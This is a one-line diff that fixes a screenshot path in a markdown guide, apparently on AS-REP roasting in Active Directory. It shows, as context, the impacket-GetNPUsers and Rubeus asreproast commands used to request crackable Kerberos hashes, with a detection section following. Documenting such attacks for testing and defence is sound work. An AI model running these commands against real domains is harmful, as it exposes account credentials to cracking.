@@ -23,7 +23,7 @@ From Linux: `impacket-GetNPUsers -dc-ip $IP $FQDN/asreppeduser -no-pass -request
 ![Description](Screenshots/kali%20linux%20impacket.png)
 
 From Windows: `.\Rubeus.exe asreproast` 
-![Description](Powershell%20Rubeus%20asreproast.png)
+![Description](Screenshots/Powershell%20Rubeus%20asreproast.png)
 
 
 ***Detection***
